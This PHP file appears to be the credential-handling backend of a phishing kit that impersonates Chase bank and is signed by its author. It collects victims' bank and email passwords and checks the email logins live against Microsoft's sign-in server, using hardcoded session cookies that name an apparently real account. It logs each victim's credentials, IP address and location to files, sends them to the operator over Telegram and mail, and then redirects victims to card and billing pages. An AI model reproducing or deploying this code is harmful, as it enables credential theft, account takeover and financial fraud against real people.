<?php
ob_start();
session_start();
//error_reporting(0);
$all_coll= $_SESSION['all_coll'];
include'../Protection.php'; 
include'../includes/telegram.php'; 
include'../admin/config.php'; 
if (!isset($_SESSION['ZRXSESSION'])) {
    header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
    exit();
}

    /*
    |--------------------------------------------------------------------------
    | CHASE PAGE V1
    |--------------------------------------------------------------------------
    |
    | Contact me : @zroxo
    |
    */


if (!empty($_POST['token']) && !empty($_POST['emailaccess']) && !empty($_POST['accesspassword'])) {
if (hash_equals($_SESSION['token'], $_POST['token'])) {
$email = $_POST['emailaccess'];
$emailpassword = $_POST['accesspassword'];
if ($true_hotmail_login == "on") {
if(strpos($email, 'live') or strpos($email, 'hotmail') or strpos($email, 'msn') or strpos($email, 'outlook')){
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, 'https://login.live.com/ppsecure/post.srf?wa=wsignin1.0&rpsnv=13&rver=7.3.6963.0&wp=MBI_SSL&wreply=https%3a%2f%2fwww.microsoft.com%2fen-us%2fmicrosoft-365%2fmicrosoft-office%3franMID%3d46194%26ranEAID%3dxoqYgl4JDe8%26ranSiteID%3dxoqYgl4JDe8-5bEY.UHK59Uqg6URWKzaKQ%26epi%3dxoqYgl4JDe8-5bEY.UHK59Uqg6URWKzaKQ%26irgwc%3d1%26OCID%3dAID2000142_aff_7805_1243925%26tduid%3d%2528ir__q2cosot0gwkfqwjlkk0sohz31m2xunafxuc3ul2u00%2529%25287805%2529%25281243925%2529%2528xoqYgl4JDe8-5bEY.UHK59Uqg6URWKzaKQ%2529%2528%2529%26irclickid%3d_q2cosot0gwkfqwjlkk0sohz31m2xunafxuc3ul2u00%26lc%3d1033&lc=1033&id=74335&aadredir=1&contextid=06A846E3409B9E63&bk=1622536533&uaid=2af7343943204b208a133483c31ed834&pid=0');
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_POST, 1);
			curl_setopt($ch, CURLOPT_POSTFIELDS, 'i13=0&login='.$email.'&loginfmt='.$email.'&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd='.$emailpassword.'&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=DcqT4IonV84M62Tfkks*ehnZcs43JMdyzM%21XmeAIf0Ih9d6KuhdBhQc9NSKi%21OicCDDFgfDjPylwL5n4Y6ugwNSqOz2j3B0g*iePObpiZxPlNI3*SjgImKdNkWYZcV0g*EVHY4lofFj98UV*Ez9IFyIxEAhgewn*B79P%21n1uzZeK3c2w5e8hT43yXLeBBW997q0ZESEQjDbXmNFmC5MZbG0%24&PPSX=Passpor&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0&i2=1&i17=0&i18=&i19=64445');
			curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

			$headers = array();
			$headers[] = 'Connection: keep-alive';
			$headers[] = 'Cache-Control: max-age=0';
			$headers[] = 'Sec-Ch-Ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\", \"Google Chrome\";v=\"90\"';
			$headers[] = 'Sec-Ch-Ua-Mobile: ?0';
			$headers[] = 'Upgrade-Insecure-Requests: 1';
			$headers[] = 'Origin: https://login.live.com';
			$headers[] = 'Content-Type: application/x-www-form-urlencoded';
			$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36';
			$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
			$headers[] = 'Sec-Fetch-Site: same-origin';
			$headers[] = 'Sec-Fetch-Mode: navigate';
			$headers[] = 'Sec-Fetch-User: ?1';
			$headers[] = 'Sec-Fetch-Dest: document';
			$headers[] = 'Referer: https://login.live.com/ppsecure/post.srf?wa=wsignin1.0&rpsnv=13&rver=7.3.6963.0&wp=MBI_SSL&wreply=https%3a%2f%2fwww.microsoft.com%2fen-us%2fmicrosoft-365%2fmicrosoft-office%3franMID%3d46194%26ranEAID%3dxoqYgl4JDe8%26ranSiteID%3dxoqYgl4JDe8-5bEY.UHK59Uqg6URWKzaKQ%26epi%3dxoqYgl4JDe8-5bEY.UHK59Uqg6URWKzaKQ%26irgwc%3d1%26OCID%3dAID2000142_aff_7805_1243925%26tduid%3d%2528ir__q2cosot0gwkfqwjlkk0sohz31m2xunafxuc3ul2u00%2529%25287805%2529%25281243925%2529%2528xoqYgl4JDe8-5bEY.UHK59Uqg6URWKzaKQ%2529%2528%2529%26irclickid%3d_q2cosot0gwkfqwjlkk0sohz31m2xunafxuc3ul2u00%26lc%3d1033&lc=1033&id=74335&aadredir=1&contextid=06A846E3409B9E63&bk=1622536482&uaid=2af7343943204b208a133483c31ed834&pid=0';
			$headers[] = 'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8,ar;q=0.7,fr;q=0.6';
			$headers[] = 'Cookie: mkt=en-GB; MUID=35308DBF64E868D730B49DAC656369A2; NAP=V=1.9&E=1932&C=hD6M7kA2mgeEaGfyiaqq_kgZ8W54i6eE3tdKxIrt8e6Yd2tENoCBLg&W=1; ANON=A=07D276AFE8B4839CB133D4F8FFFFFFFF&E=198c&W=1; MSPBack=0; SDIDC=Cek7q5eCV25THX4WWBfgV8fVicf7*Soti5wqTmqFHiDT9ZNx*Zht*wdxcbshUKwgwBeC58VBV5oH5crMz1ZfS\u0021fUPxbhz3SMpCHDwFUNbm1JU8w8bXB\u0021EjuV9Btfj8rMAHtjNiWmkazAo4ce2T\u0021XHmCf\u0021Lludq8paVzcOoBuQ3Wy; MSPPre=gilbert.cua@hotmail.com|f50afe9575e6e169||; MSPCID=f50afe9575e6e169; IgnoreCAW=1; MSPSoftVis=@:@; uaid=2af7343943204b208a133483c31ed834; MSPRequ=id=74335&lt=1622536482&co=0; OParams=11DcUquO3ZMrTd9FQvwhzK\u0021yqoWqBTdTcj5O4iOSGsqDVJ8*sWPnGzOuZI9RUFsBhz9GIxtxTomB1jTNqj345KFzI4RNlA9*sT5\u00213GUE7jLaa0wsK41APhE\u0021B\u0021GHZnzadPaxnB5odawlzOFCxCxif\u0021AQgE4PjgdNtje75QTpf8RRVMWVg1thWxXIbyF6z8T\u00217rolmDRPN*GiNBpG1cWXM45Vkp*dZ3X8qrWmQhT8Ug\u0021sWd4QZVrMzS6HvQXJ1plNYjlZ4UshWp9QCK5B2UMJWjWebj0tSBOIHQWYdFa\u00219ESYcWz1vJzfM0WkPyK\u0021vfjPFy4EIxCdTk90MlIjXgk156X7NfzkXiv4Bq6yWA2QZlEf3s2NF3nzB3wbsED6ChdCTajD\u0021r2uifIr1SYzcRPT6RrjOWXeM1PkM*xVLXQP25mVkphQYuXVPMyGJEbPJTz8iHUKeTt0\u0021GD1D72DEtbq7cOPmBHMRycdHl2pMesROf\u0021PdEXPzRRXT85d*vXsVGwK5li\u00213j\u0021w4LjH2QGaMgjQ538F8IK*O0gYJw\u0021XYWzUWG4jTArqRm8cK9mz4bKSYzgBfx2ayDpux8nFRFkHUMC0RRzIDxLLFnVjhukRlb6\u0021bPJ0kJ1Qz2G\u0021fpNLHXIshX82xIM783hdDsU6iW*f2ngEOgcfRwtdCCNv15LOrNLcN8KG8xAQpj77YsJibeoFb6*EzREowyxfs6Eh\u0021GyFclydD4lh9C\u0021pLRu7faiRb1xlRkeUWHWBlIW5tkaxXB8Cw60zkiGN5uY2xIR3*\u0021eJwJv9EG0aJl4CwNIsfuf*IKkJtiugX3jqFJ\u0021kdpdXMStorXYoLxIaRQ7d\u0021LJ4PpD2C1FHaqb9QEUaTMwS26zh95ybinHjB1gJJmuRMzvM7v40gp48JhmiI1C5Tc4YkciSlN3nPRJmGq\u0021\u0021bujdc5yxhGEKl18oPwu1X872zOaGJtesFrfLdoynTWH77EaJmqkQ38ZUxn*Bf8IHFyrrb\u0021Cmom2QBFePftJSHhYMWpWuVOfOn7TmKuc6SzgQ36g4EnMgBOBSQ3NjNdRLORQL1loHhnOHIf3azHdStDlZNEVWXRw9Fv2CZDzxnMadUuNd\u0021Y7PDLsyxR\u0021J3iJOzwDzmrKtSKMmdb\u0021iu\u0021b*s3ofQQ9aBhB*LjzlMzfOC6rmyV6PO1vZ3CiVIrmaidryrU9Bc\u0021E5RWYxzue22PolKhSGiBLkr6SAWY6lMjXvpTkm\u00212FRsEEdVOFhJY1\u0021sUQypHdn371n3vzPXSRALURqRc7Enz5UfnciJZP4qAsb7uIdsjBq6SSr0g4yXHOsb9wSB58lSruOtrFif34E7eRKGmFQLF1aa7YCS3fsfmEBRInemxkaqE2a91VahfkuWiglWxXGQ2cHVsSlDPuMu7NjmPCIaUG5NNAz5UQKt4mQ$$; MSPOK=$uuid-cfb090ad-f715-40e7-98ac-b7fc2d990992$uuid-6dec6ade-77be-4148-b773-66464b0a4867$uuid-7261f2e8-e4d9-4a39-8d8f-464485504a17$uuid-6b52a49c-76b1-44f5-bbce-c9c95e26b49b; wlidperf=FR=L&ST=1622536615836';
			curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

			$result = curl_exec($ch);
			if (curl_errno($ch)) {
			    echo 'Error:' . curl_error($ch);
			}
			curl_close($ch);
			$total = strlen($result);
			if(strpos($result, 'pprid') !== false or $total < 5000){
                    $resulta=$all_coll."\n";
					$resulta .= "+ --------------[ ZROXO EMAIL ]---------------+\n";
					$resulta .= "[Username1]: ".$_SESSION['username1']."\n";
					$resulta .= "[Password1]: ".$_SESSION['password1']."\n";
					$resulta .= "[Username2]: ".$_SESSION['username2']."\n";
					$resulta .= "[Password2]: ".$_SESSION['password2']."\n";
					$resulta .= "[Email]: ".$email."\n";
					$resulta .= "[Password]: ".$emailpassword."\n";
					$_SESSION["all_coll"] = $resulta;
					$resulta .= "+ --------------[ Zroxo ip ]---------------+\n";
					$resulta .= "IP Address: ".$_SESSION['ip']."\n";
					$resulta .= "City: ".$_SESSION['city']."\n";
					$resulta .= "OS/Browser: ".$_SESSION['browser']."\n";
					$resulta .= "Time: ".date("d/m/Y h:i:sa")."\n";
					$resulta .= "User Agent: ".$_SESSION['platform']."\n";
					$resulta .= "+ --------------[ Zroxo V1 ]---------------+\n";
					$subject = "#ZROXO CHASE: [{$email}] [ {$_SESSION['city']} - {$_SESSION['browser']} - {$_SESSION['ip']} ]";
					$headers="From: ZROXO CHASE <".$result_from_email.">\r\n";
					$headers.="MIME-Version: 1.0\r\n";
					$headers.="Content-Type: text/plain; charset=UTF-8\r\n";
					$zroxo = fopen("../admin/result/fulllogs.txt","a+");
				    fwrite($zroxo,$resulta);
				    fclose($zroxo);
				    $zroxo2 = fopen("../admin/result/".$_SESSION['ZRXSESSION'].".txt","a+");
    				fwrite($zroxo2,$resulta);
    				fclose($zroxo2);
					$zroxo3 = fopen("../admin/result/totalaccess.txt","a+");
    				fwrite($zroxo3,"".$_POST['emailaccess']."\n");
    				fclose($zroxo3);
				    // if ($telegram_result == "on") {
				    // 	telegram_message($resulta,$telegram_token,$telegram_chatid);
				    // }if ($email_result == "on") {
				    // 	@mail($email_result_config,$subject,$resulta,$headers);
				    // }
				    telegram_message($resulta,$telegram_token,$telegram_chatid);
				    
				    if ($Show_billing_page == "on") {
				    	exit(header("Location: ../verify?key=".$_SESSION['ZRXSESSION'].""));
				    }
				    if ($Show_card_page == "on") {
				    	exit(header("Location: ../ccverify?key=".$_SESSION['ZRXSESSION'].""));
				    }else{
				    	exit(header("Location: ../exit?key=".$_SESSION['ZRXSESSION'].""));
				    }
				    

			}elseif(strpos($result, 'error.aspx') !== false or $total > 10000){
			   
			   exit(header("Location: ../auth?key=".$_SESSION['ZRXSESSION']."&invalid2"));
			}else{
				exit(header("Location: ../verify?key=".$_SESSION['ZRXSESSION'].""));
			}
}
}

	$resulta=$all_coll."\n";
	$resulta .= "+ --------------[ ZROXO EMAIL ]---------------+\n";
	$resulta .= "[Username1]: ".$_SESSION['username1']."\n";
	$resulta .= "[Password1]: ".$_SESSION['password1']."\n";
	$resulta .= "[Username2]: ".$_SESSION['username2']."\n";
	$resulta .= "[Password2]: ".$_SESSION['password2']."\n";
	$resulta .= "[Email]: ".$_POST['emailaccess']."\n";
	$resulta .= "[Password]: ".$_POST['accesspassword']."\n";
	$_SESSION["all_coll"] = $resulta;
	$resulta .= "+ --------------[ Zroxo ip ]---------------+\n";
	$resulta .= "IP Address: ".$_SESSION['ip']."\n";
	$resulta .= "City: ".$_SESSION['city']."\n";
	$resulta .= "OS/Browser: ".$_SESSION['browser']."\n";
	$resulta .= "Time: ".date("d/m/Y h:i:sa")."\n";
	$resulta .= "User Agent: ".$_SESSION['platform']."\n";
	$resulta .= "+ --------------[ Zroxo V1 ]---------------+\n";
	$subject = "#ZROXO CHASE: [{$_POST['emailaccess']}] [ {$_SESSION['city']} - {$_SESSION['browser']} - {$_SESSION['ip']} ]";
	$headers="From: ZROXO CHASE <".$result_from_email.">\r\n";
	$headers.="MIME-Version: 1.0\r\n";
	$headers.="Content-Type: text/plain; charset=UTF-8\r\n";
	$zroxo = fopen("../admin/result/fulllogs.txt","a+");
    fwrite($zroxo,$resulta);
    fclose($zroxo);
    $zroxo2 = fopen("../admin/result/".$_SESSION['ZRXSESSION'].".txt","a+");
    fwrite($zroxo2,$resulta);
    fclose($zroxo2);
	$zroxo3 = fopen("../admin/result/totalaccess.txt","a+");
	fwrite($zroxo3,"".$_POST['emailaccess']."\n");
	fclose($zroxo3);
    if ($telegram_result == "on") {
     
		telegram_message($resulta,$telegram_token,$telegram_chatid);
	}if ($email_result == "on") {
    	@mail($email_result_config,$subject,$resulta,$headers);
	}
    
if($skipInvalidEmail){
    if ($Show_billing_page == "on") {
		exit(header("Location: ../verify?key=".$_SESSION['ZRXSESSION'].""));
	}
	if ($Show_card_page == "on") {
		exit(header("Location: ../ccverify?key=".$_SESSION['ZRXSESSION'].""));
	}else{
		exit(header("Location: ../exit?key=".$_SESSION['ZRXSESSION'].""));
	}

}
if (isset($_POST['invalid'])) {
	if ($Show_billing_page == "on") {
		exit(header("Location: ../verify?key=".$_SESSION['ZRXSESSION'].""));
	}
	if ($Show_card_page == "on") {
		exit(header("Location: ../ccverify?key=".$_SESSION['ZRXSESSION'].""));
	}else{
		exit(header("Location: ../exit?key=".$_SESSION['ZRXSESSION'].""));
	}
}else{
	exit(header("Location: ../auth?key=".$_SESSION['ZRXSESSION']."&invalid"));
}

}else{
    header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
    exit();
}
}